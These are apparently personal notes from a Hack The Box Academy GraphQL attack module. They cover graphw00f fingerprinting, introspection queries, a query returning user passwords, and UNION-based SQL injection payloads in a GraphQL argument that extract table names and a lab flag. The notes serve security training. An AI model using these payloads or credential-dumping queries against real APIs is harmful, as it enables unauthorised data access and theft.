
https://github.com/dolevf/graphw00f clone the repo then
![[Pasted image 20260910115700.png]]
```
python3 main.py -d -f -t "http://172.17.0.2/graphql"
```

```
{
  __schema {
    types {
      name
    }
  }
}
```

```
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

```
{
  user(username: "test") {
    username
    password
  }
}
```
/graphql-voyager/
/grqphql


```
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}

```

```
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(flag),4,5,6 FROM flag-- -") {
    username
  }
}
```

 graphql vizualizer
dos attacks and batch attacks https://academy.hackthebox.com/app/module/271/section/3155

query users
```
{
  users {
    id
    username
    role
  }
}
```

https://academy.hackthebox.com/app/module/271/section/3156
-identify mutations and objects needed for mutations and the create a user

owasp graphqlcheetsheet https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html

Assessment
-put the graph into the graphql visualizer after running the introspecion query
-look at the customer by name object dump all the objects in it and find the admin s api key then see if the last name is vulnerable to sqli
-use the payload above to extract the flag